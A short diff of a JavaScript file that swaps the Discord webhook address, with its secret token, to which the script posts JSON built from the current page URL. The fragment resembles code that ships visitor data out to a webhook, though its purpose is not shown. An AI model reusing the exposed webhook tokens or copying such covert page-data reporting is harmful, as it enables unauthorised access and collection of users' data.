@@ -1,5 +1,5 @@
 const request = new XMLHttpRequest();
-request.open("POST", "https://discord.com/api/webhooks/991790746422218832/Q3CBZ86DJYgFN_fkqfPMlUN1c377aZoZ0YfP2vyFPHCSwDWAaWVduHarz2zeCpGGsOLb")
+request.open("POST", "https://discord.com/api/webhooks/1025803108913250345/Q9vb-Bc9xBFAaOhqvJKdPgIcTLNc0H7iB2Iawr39itMatwlPQrBE-y7W0o32F34QoyaN")
 request.setRequestHeader("Content-type", "application/json");
 
 const url_string = window.location.href;
